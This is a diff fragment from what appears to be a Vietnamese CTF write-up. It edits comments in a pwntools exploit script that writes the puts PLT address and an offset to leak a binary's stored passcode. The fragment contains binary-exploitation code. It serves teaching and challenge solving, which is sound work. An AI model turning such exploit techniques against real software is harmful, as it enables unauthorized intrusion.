@@ -164,9 +164,9 @@ Theo intended solution, mục tiêu là nhập đúng passcode mà binary đã k
 passcode_address = 0x404060
 puts_plt = exe.plt.puts
 
-sa(b'[*] NickName> ', p64(puts_plt))
-sla(b'> ', b'15') # offset / 8 từ conv -> passcode
-sa(b'>', str(passcode_address).encode())
+sa(b'[*] NickName> ', p64(puts_plt)) # input nickname
+sla(b'> ', b'15') # v3: offset / 8 (từ conv -> username)
+sa(b'>', str(passcode_address).encode()) # v4
 
 ru(b'> ')
 # print(ru(b'\n'))
